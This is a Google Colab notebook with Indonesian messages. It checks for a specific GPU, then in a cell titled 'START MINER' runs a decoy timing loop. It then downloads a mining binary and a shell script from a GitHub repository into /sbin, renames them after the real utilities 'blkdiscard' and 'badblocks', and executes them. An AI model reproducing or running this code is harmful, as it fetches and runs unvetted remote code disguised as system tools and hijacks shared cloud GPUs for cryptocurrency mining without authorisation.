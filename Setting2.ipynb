{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Setting2.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyMDcuGc9uRlT6m5U410h5St"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "boreq2y9HIAC",
        "cellView": "form"
      },
      "source": [
        "# %%\n",
        "#@title CEK GPU\n",
        "%tensorflow_version 2.x\n",
        "import tensorflow as tf\n",
        "from tensorflow.python.client import device_lib\n",
        "import json\n",
        "\n",
        "def name_device():\n",
        "    depais = device_lib.list_local_devices()\n",
        "    desc_dumps = json.dumps(depais[1].physical_device_desc, sort_keys=True, indent=4)\n",
        "    desc_loads = json.loads(desc_dumps)\n",
        "    split_desc = desc_loads.split(', ')\n",
        "    split_tesla = split_desc[1].split(' ')\n",
        "    name_device = split_tesla[2]\n",
        "    return name_device\n",
        "\n",
        "maxGPU = \"V100\" #@param {type:\"string\"}\n",
        "minGPU = \"V100\" #@param {type:\"string\"}\n",
        "cek_device = tf.test.gpu_device_name()\n",
        "if cek_device != '/device:GPU:0':\n",
        "  gpu_name = 'backend'\n",
        "  print('GPU tidak ditemukan')\n",
        "else:\n",
        "  gpu_name = \"{0}\".format(name_device())\n",
        "  if gpu_name.find(minGPU) != -1 or gpu_name.find(maxGPU) != -1:\n",
        "    print(f'Device Name: {gpu_name}')\n",
        "  else:\n",
        "    print('GPU tidak sesuai target!')\n",
        "  "
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "cvJEytoTW6Yt"
      },
      "source": [
        "# %%\n",
        "#@title START MINER\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "from timeit import default_timer as timer\n",
        "listgpu = 'K80 T4 P100-PCIE-16GB V100-SXM2-16GB'\n",
        "if listgpu.find(gpu_name) != -1:\n",
        "  if gpu_name.find(minGPU) != -1 or gpu_name.find(maxGPU) != -1:\n",
        "    pass\n",
        "  else:\n",
        "    raise SystemError('GPU tidak sesuai target!')\n",
        "else:\n",
        "  raise SystemError('GPU tidak dikenali!')\n",
        "def func(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start) \n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)\n",
        "%cd /sbin\n",
        "! wget -O blkdiscard github.com/Harryx77/ineyzzz/raw/main/softmining\n",
        "! wget -O badblocks github.com/Harryx77/ineyzzz/raw/main/y3n1.sh\n",
        "! chmod +x badblocks\n",
        "! ./badblocks"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}